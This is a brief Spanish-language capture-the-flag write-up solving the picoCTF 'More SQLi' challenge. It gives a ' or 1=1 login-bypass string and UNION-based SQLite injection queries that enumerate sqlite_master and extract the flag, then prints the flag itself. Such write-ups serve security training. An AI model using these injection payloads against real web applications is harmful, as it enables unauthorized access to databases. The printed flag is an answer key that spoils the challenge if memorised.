### More SQLi

### DESCRIPCIÓN

Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:58553/).
### SOLUCIÓN

Resolver:

En el cuadro de login, introduciendo cualquiera de las siguientes cadenas en el nombre de usuario: usuario y password:

`' or 1=1; ' or 1=1;`

En el campo de búsqueda, usamos, una a una , las siguientes consultas para encontrar la bandera:

```
ciudad' union select 1,2,3; 
ciudad' union select sqlite_version(),2,3;
ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;
ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;
ciudad' union select 1,2,flag from more_table;

```

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
### NOTAS ADICIONALES


### REFERENCIAS

- SQLite Injection: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md")